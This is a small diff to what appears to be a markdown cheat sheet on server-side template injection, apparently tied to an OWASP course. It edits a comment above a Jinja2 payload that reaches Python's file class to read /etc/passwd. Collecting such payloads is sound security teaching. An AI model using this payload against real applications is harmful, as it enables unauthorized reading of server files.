@@ -23,7 +23,7 @@ Included [here](https://github.com/RiieCco/owasp-bay-area/tree/master/course-gui
 
 Jinja2 - Read remote file
 ```
-# ''.__class__.__mro__[2].__subclasses__()[40] = File class
+# ''.__class__.__mro__[2].__subclasses__() = File class
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
 ```
 
